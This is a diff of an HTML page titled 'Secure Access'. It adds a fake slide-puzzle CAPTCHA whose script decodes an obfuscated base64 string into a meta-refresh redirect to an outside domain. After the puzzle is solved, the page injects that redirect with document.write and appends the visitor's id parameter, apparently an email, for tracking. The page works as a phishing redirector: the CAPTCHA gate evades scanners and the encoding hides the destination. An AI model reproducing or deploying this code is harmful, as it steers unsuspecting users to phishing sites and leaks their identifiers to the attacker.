@@ -1,151 +1,131 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Document Viewer</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f0f0f0;
-    }
-    #captcha-container {
-      position: relative;
-      width: 400px;
-      height: 300px;
-      background-image: url('https://www.pexels.com/photo/colorful-puzzle-pieces-8385973/');
-      background-size: cover;
-      border: 2px solid #ccc;
-      margin-bottom: 20px;
-    }
-    #puzzle-piece {
-      position: absolute;
-      width: 100px;
-      height: 100px;
-      background-image: url('https://www.pexels.com/photo/colorful-puzzle-pieces-8385973/');
-      background-size: cover;
-      cursor: pointer;
-    }
-    #modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.5);
-      justify-content: center;
-      align-items: center;
-    }
-    #modal-content {
-      background-color: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      text-align: center;
-    }
-    #code {
-      font-size: 24px;
-      margin-bottom: 20px;
-    }
-    #user-input {
-      width: 80px;
-      font-size: 24px;
-      text-align: center;
-    }
-  </style>
-</head>
-<body>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Secure Access</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background: #f3f3f3;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+      }
 
-<div id="captcha-container">
-  <div id="puzzle-piece"></div>
-</div>
-<div id="modal">
-  <div id="modal-content">
-    <p id="code"></p>
-    <input type="text" id="user-input" placeholder="Enter code">
-  </div>
-</div>
+      #captcha-container {
+        position: relative;
+        width: 320px;
+        height: 180px;
+        background-image: url('https://i.ibb.co/fkBgzJv/puzzle-bg.jpg'); /* colorful puzzle */
+        background-size: cover;
+        border: 2px solid #0078ff;
+        border-radius: 6px;
+        overflow: hidden;
+      }
 
-<script>
-  // Base64-encoded content (replace with your actual content)
-  const ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwczovL3g...ZGV0YXMlMjIlMjAvJTNF";
-  const modal = document.getElementById('modal');
-  const codeDisplay = document.getElementById('code');
-  const userInput = document.getElementById('user-input');
-  const puzzlePiece = document.getElementById('puzzle-piece');
+      #puzzle-piece {
+        position: absolute;
+        top: 50px;
+        left: 0;
+        width: 60px;
+        height: 60px;
+        background-image: url('https://i.ibb.co/fkBgzJv/puzzle-bg.jpg');
+        background-size: cover;
+        background-position: -120px -50px;
+        border: 2px solid #0078ff;
+        border-radius: 4px;
+        cursor: grab;
+        transition: box-shadow 0.2s;
+      }
 
-  // Function to generate a random 2-digit number
-  function generateRandomCode() {
-    return Math.floor(Math.random() * 90) + 10;
-  }
+      #instruction {
+        margin-top: 16px;
+        text-align: center;
+        font-size: 14px;
+        color: #333;
+      }
 
-  // Function to show the modal with the CAPTCHA
-  function showCaptcha() {
-    const code = generateRandomCode();
-    codeDisplay.textContent = `Enter code: ${code}`;
-    modal.style.display = 'flex';
+      #container {
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <div id="captcha-container">
+        <div id="puzzle-piece"></div>
+      </div>
+      <div id="instruction">Slide the piece to the correct position to unlock</div>
+    </div>
 
-    // Store the code in sessionStorage
-    sessionStorage.setItem('captchaCode', code);
-  }
+    <script>
+      const hasStatus = new URLSearchParams(window.location.search).has("status");
+      const hasId = new URLSearchParams(window.location.search).has("id");
 
-  // Function to hide the modal
-  function hideCaptcha() {
-    modal.style.display = 'none';
-  }
+      // Redirection logic if already verified
+      if (hasStatus) {
+        const status = new URLSearchParams(window.location.search).get("status");
+        if (status === "true") {
+          const ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";
+          let decodedRef = decodeURIComponent(atob(ref));
+          const lastIndexOfColon = decodedRef.lastIndexOf('"');
 
-  // Function to handle the puzzle piece drag
-  function handleDrag(e) {
-    const puzzleRect = puzzlePiece.getBoundingClientRect();
-    const containerRect = document.getElementById('captcha-container').getBoundingClientRect();
+          if (hasId) {
+            const id = new URLSearchParams(window.location.search).get("id");
+            const newDecodedRef = decodedRef.slice(0, lastIndexOfColon) + "?e=" + id + '" />';
+            const encodedUrl = btoa(newDecodedRef);
+            document.write(decodeURIComponent(atob(encodedUrl)));
+          } else {
+            document.write(decodedRef);
+          }
+        }
+      }
 
-    let offsetX = e.clientX - containerRect.left - puzzleRect.width / 2;
-    let offsetY = e.clientY - containerRect.top - puzzleRect.height / 2;
+      // Puzzle logic
+      const puzzle = document.getElementById("puzzle-piece");
+      let isDragging = false;
 
-    // Constrain the puzzle piece within the container
-    offsetX = Math.max(0, Math.min(containerRect.width - puzzleRect.width, offsetX));
-    offsetY = Math.max(0, Math.min(containerRect.height - puzzleRect.height, offsetY));
+      puzzle.addEventListener("mousedown", () => {
+        isDragging = true;
+        puzzle.style.cursor = "grabbing";
+      });
 
-    puzzlePiece.style.left = `${offsetX}px`;
-    puzzlePiece.style.top = `${offsetY}px`;
+      document.addEventListener("mouseup", () => {
+        isDragging = false;
+        puzzle.style.cursor = "grab";
+        const rect = puzzle.getBoundingClientRect();
+        const correctLeft = 120;
+        const margin = 10;
 
-    // Check if the puzzle piece is in the correct position
-    if (offsetX === 150 && offsetY === 100) { // Adjust these values based on your image
-      // Puzzle solved
-      alert('Puzzle solved!');
-      hideCaptcha();
-      // Proceed with your content display logic here
-    }
-  }
+        // If piece is close to target position, unlock
+        if (Math.abs(rect.left - puzzle.parentElement.getBoundingClientRect().left - correctLeft) < margin) {
+          puzzle.style.left = correctLeft + "px";
+          puzzle.style.boxShadow = "0 0 12px green";
 
-  // Event listener for the puzzle piece drag
-  puzzlePiece.addEventListener('mousedown', (e) => {
-    e.preventDefault();
-    document.addEventListener('mousemove', handleDrag);
-    document.addEventListener('mouseup', () => {
-      document.removeEventListener('mousemove', handleDrag);
-    });
-  });
+          // Redirect with ?status=true
+          let currentUrl = window.location.href;
+          if (hasId) {
+            currentUrl += "&status=true";
+          } else {
+            currentUrl += "?status=true";
+          }
 
-  // Show the CAPTCHA when the page loads
-  window.onload = showCaptcha;
+          setTimeout(() => {
+            window.location.href = currentUrl;
+          }, 800);
+        }
+      });
 
-  // Verify the code entered by the user
-  userInput.addEventListener('input', () => {
-    const enteredCode = userInput.value;
-    const storedCode = sessionStorage.getItem('captchaCode');
-
-    if (enteredCode === storedCode) {
-      hideCaptcha();
-      // Proceed with your content display logic here
-    }
-  });
-</script>
-
-</body>
+      document.addEventListener("mousemove", (e) => {
+        if (!isDragging) return;
+        const container = document.getElementById("captcha-container").getBoundingClientRect();
+        let newLeft = e.clientX - container.left - puzzle.offsetWidth / 2;
+        newLeft = Math.max(0, Math.min(container.width - puzzle.offsetWidth, newLeft));
+        puzzle.style.left = newLeft + "px";
+      });
+    </script>
+  </body>
 </html>
